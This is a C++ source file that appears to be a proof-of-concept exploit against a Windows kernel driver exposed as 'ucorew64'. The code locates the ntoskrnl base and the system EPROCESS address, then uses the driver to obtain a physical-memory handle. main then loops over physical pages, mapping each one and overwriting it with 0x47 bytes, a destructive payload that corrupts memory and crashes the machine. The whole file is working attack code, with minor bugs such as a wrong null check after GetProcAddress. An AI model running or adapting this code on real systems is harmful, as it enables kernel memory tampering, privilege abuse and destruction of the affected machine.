#pragma comment(lib, "ntdll.lib") // link "ntdll.lib" for NtQuerySystemInformation()
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include "rw_primitive.h"


typedef struct struct_buffer
{
	void* SectionHandle;
	DWORD offset;
	unsigned int BusAddress;
	PVOID PhysicalBaseAddress;
} struct_buffer;


typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;
//source: https://processhacker.sourceforge.io/doc/ntldr_8h_source.html


LPVOID EPROCESS_address(LPVOID ntoskernlBase) {
	HMODULE hNtoskrl = LoadLibrary(L"ntoskrnl.exe");
	if (hNtoskrl == NULL) {
		fprintf(stderr, "LoadLibrary failed.\n");
		return NULL;
	}

	LPVOID PsInitialSystemProcess = (LPVOID)GetProcAddress(hNtoskrl, "PsInitialSystemProcess");
	if (hNtoskrl == NULL) {
		fprintf(stderr, "GetProcAddress failed.\n");
		return NULL;
	}
	__int64 EPROCESS_address = (__int64)PsInitialSystemProcess - (__int64)hNtoskrl + (__int64)ntoskernlBase;
	return (LPVOID)EPROCESS_address;
}

LPVOID ntoskernl_base(void) {
	PVOID nt_base = NULL;
	ULONG systemInformationLength = 1024 * 1024;

	PRTL_PROCESS_MODULES processModules = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, systemInformationLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (processModules == NULL) {
		fprintf(stderr, "VirtualAlloc failed.\n");
		return NULL;
	}

	PULONG returnLength = 0;
	NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, processModules, systemInformationLength, returnLength);
	if (!NT_SUCCESS(status)) {
		fprintf(stderr, "NtQuerySystemInformation failed: %ld\n", status);
		VirtualFree(processModules, 0, MEM_RELEASE);
		return NULL;
	}

	for (ULONG i = 0; i < processModules->NumberOfModules; i++)
	{

		const char* imageName = (const char*)processModules->Modules[i].FullPathName + processModules->Modules[i].OffsetToFileName;
		if (strcmp("ntoskrnl.exe", imageName) == 0) {
			nt_base = processModules->Modules[i].ImageBase;

			printf("\n*****************************************************");
			printf("\nImage base: %#p", processModules->Modules[i].ImageBase);
			printf("\nImage name: %s", processModules->Modules[i].FullPathName + processModules->Modules[i].OffsetToFileName);
			printf("\nImage full path: %s", processModules->Modules[i].FullPathName);
			printf("\nImage size: %d", processModules->Modules[i].ImageSize);
			printf("\n*****************************************************\n");
		}
	}


	return nt_base;
}

int main(char argc, char** argv)
{
	printf("\n\n\nEPROCESS_adress: %p\n", EPROCESS_address(ntoskernl_base()));
	HANDLE hPhys = nullptr;
	hPhys = GetDevicePhysicalMemoryHandle(L"\\\\.\\ucorew64");
	if (hPhys == NULL) {
		fprintf(stderr, "Could not obtain Device PhysicalMemory\n");
		exit(EXIT_FAILURE);
	}

	PDWORD64 buf = (PDWORD64)malloc(0x1000);
	if (buf == 0) {
		exit(EXIT_FAILURE);
	}

	for (__int64 page = 0; page < 0x7FFFFFFFFFFF; page = page + 0x1000) {
		MapPhysicalMemory(hPhys, page, 0x1000, buf);
		memset(buf, 0x47, 0x1000);
		printf("Set %lld to 0x47: \n", page);
	}

	free(buf);

	CloseHandle(hPhys);
	return EXIT_SUCCESS;
}